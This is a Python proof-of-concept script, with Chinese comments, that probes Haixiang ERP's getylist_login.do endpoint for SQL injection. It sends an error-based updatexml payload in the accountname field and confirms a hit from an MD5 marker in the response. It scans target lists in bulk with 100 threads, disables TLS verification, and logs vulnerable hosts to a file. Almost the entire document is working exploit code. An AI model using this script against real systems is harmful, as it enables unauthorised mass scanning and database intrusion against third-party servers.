#海翔ERP getylist_login.do SQL注入漏洞
import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def main():
    parser = argparse.ArgumentParser(description="海翔ERP getylist_login.do SQL注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()

    else:
        print(f"\n\tUage:python {sys.argv[0]} -h")
def poc(target):
    payload_url = "/getylist_login.do"
    url = target+payload_url
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Content-Length": "66",
        "Connection": "keep-alive"
    }
    data = "accountname=test' and (updatexml(1,concat(0x7e,MD5(1),0x7e),1));--"
    proxies={
         'http':'http://127.0.0.1:8080',
         'https':'http://127.0.0.1:8080'
    }
    try:
        res = requests.post(url=url,headers=headers,data=data,verify=False,timeout=10,proxies=proxies)
        if res.status_code ==500 and "~c4ca4238a0b923820dcc509a6f75849&#" in res.text :
            print(f"该url存在漏洞{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                        fp.write(target+"\n")
        else:
            print(f"该url不存在漏洞{target}")
    except Exception as e:
        print(f"该url存在问题{target}"+e)
if __name__ == '__main__':
    main()
